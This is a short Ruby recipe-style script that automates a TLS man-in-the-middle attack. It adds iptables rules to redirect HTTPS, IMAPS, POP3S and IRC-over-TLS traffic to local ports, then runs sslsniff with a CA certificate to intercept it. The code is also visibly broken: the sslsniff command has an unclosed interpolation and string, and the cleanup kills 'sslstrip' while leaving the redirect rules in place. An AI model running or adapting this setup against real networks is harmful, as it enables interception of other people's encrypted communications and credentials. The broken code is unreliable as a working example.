add_spices do
  opt :dry_run, "Don't actually do anything, just print steps", :short => '-d'
  opt :log_dir, "Output logs to this directory", :short => '-l', :type => :string
  opt :targetiface, "Target interface", :short => '-i', :type => :string
  opt :stripport, "Sslsniff's listening port"
  opt :kill_all, "Kill all processes", :short => '-k'
  opt :run, "Run with defaults", :short => '-r'
end

requirements do
  puts "Checking Requirements for sslsniff"
  req  :targetiface
end

cook do
  puts "Cooking sslsniff"
  System "iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 10443"
  System "iptables -t nat -A PREROUTING -p tcp --destination-port 993 -j REDIRECT --to-ports 10993"
  System "iptables -t nat -A PREROUTING -p tcp --destination-port 995 -j REDIRECT --to-ports 10995"
  System "iptables -t nat -A PREROUTING -p tcp --destination-port 6697 -j REDIRECT --to-ports 16697"
  System "sslsniff -a -d -c /usr/share/ca-certificates/mozilla/VeriSign_Class_3_Public_Primary_Certification_Authority_-_G5.crt -s #{options[:stripport] -w $SSLSNIFF_LOG 

end

cleanup do
  puts "Cleaning up after sslsniff"
  kill "sslstrip"
end